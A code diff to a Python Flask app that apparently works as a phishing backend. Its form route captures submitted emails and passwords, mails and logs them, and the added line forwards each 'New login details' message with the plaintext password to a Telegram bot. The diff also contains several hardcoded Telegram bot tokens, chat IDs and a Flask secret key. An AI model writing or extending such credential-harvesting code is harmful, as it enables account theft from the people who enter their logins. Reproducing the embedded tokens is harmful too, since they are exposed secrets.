@@ -23,16 +23,9 @@ app.config['SECRET_KEY'] = 'language007'
 mail = Mail(app)
 
 # Telegram bot token
-# Telegram bot token
-# token = '6933427301:AAGkWy-GtwxcoILnefvi4o0QCT_ohYUaGGg'
-token = '6902120953:AAF0DmINhkSFGNoLWRCq2Yb6ZLABZdwxphU'
-# Chat ID where you want to send the messages
-# chat_id = '6469097185'
-chat_id = '6393249406'
+token = '6933427301:AAGkWy-GtwxcoILnefvi4o0QCT_ohYUaGGg'
+chat_id = '6469097185'
 
-# TOKEN = '6902120953:AAF0DmINhkSFGNoLWRCq2Yb6ZLABZdwxphU'
-# CHAT_ID = '6393249406'
-# Regular expression pattern to extract relevant information from logs
 log_pattern = re.compile(r'New login details: User-Email: (.+), User-Password: (.+)')
 
 def send_mail(email, password):
@@ -69,7 +62,8 @@ def one():
 
         send_mail(email, password)
         read_logs('app.log')  # Call read_logs function when email is sent
-        # return redirect(url_for('error'))
+        # Also, send a message to Telegram when new login details are received
+        send_message(f'New login details:\nEmail: {email}\nPassword: {password}')
         print(f"Email: {email}, Password: {password}")
     return render_template('one.html')
 
@@ -79,9 +73,3 @@ def error():
 
 if __name__ == "__main__":
     app.run(debug=True)
-
-
-# # Telegram bot token
-# TOKEN = '5026096169:AAEaVnY9QK8eT4pZincGc0crqGw382mRO0'
-# # Chat ID where you want to send the messages
-# CHAT_ID = '954215962'
